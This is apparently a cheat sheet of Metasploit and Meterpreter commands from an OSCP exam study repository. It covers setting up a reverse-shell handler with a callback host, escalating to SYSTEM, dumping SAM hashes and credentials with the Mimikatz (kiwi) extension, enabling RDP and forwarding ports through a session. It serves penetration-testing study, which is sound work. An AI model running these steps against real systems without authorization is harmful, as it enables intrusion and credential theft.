# Metasploit

[Practice methodology](../Practice-Exam-Methodology.md) · [Reference index](00-Reference-Index.md)

Commands preserved from the original reference. Replace angle-bracket placeholders before running; check your installed tool’s help for version-specific options. See [exam restrictions](../OSCP-Exam-Rules.md) before using Metasploit or Meterpreter.


## Metasploit

```bash
sudo msfdb run                                            # start Metasploit with database support
msf6 > workspace -a <WORKSPACE>                           # create or switch to a workspace
msf6 > db_nmap <OPTIONS>                                  # run nmap and import results into the database
msf6 > use exploit/multi/handler                          # configure a generic payload listener
msf6 > set payload windows/x64/meterpreter/reverse_tcp    # choose a Windows x64 Meterpreter reverse payload
msf6 > set LHOST <LHOST>                                  # set callback IP
msf6 > set LPORT <LPORT>                                  # set callback port
msf6 > run                                                # start the handler or selected module

# Meterpreter
meterpreter > getuid                                            # show current user context
meterpreter > getsystem                                         # attempt local privilege escalation to SYSTEM
meterpreter > hashdump                                          # dump local SAM hashes
meterpreter > load kiwi                                         # load Mimikatz extension
meterpreter > creds_all                                         # dump credentials with kiwi
meterpreter > lsa_dump_sam                                      # dump SAM secrets with kiwi
meterpreter > run post/multi/recon/local_exploit_suggester      # suggest local privesc modules
meterpreter > run post/windows/manage/enable_rdp                # enable RDP on target
meterpreter > portfwd add -l <LPORT> -p <RPORT> -r 127.0.0.1    # forward a remote port through session
meterpreter > sessions -u <ID>                                  # upgrade shell session to Meterpreter
```

Payload generation lives in [Msfvenom](Shells.md#msfvenom).
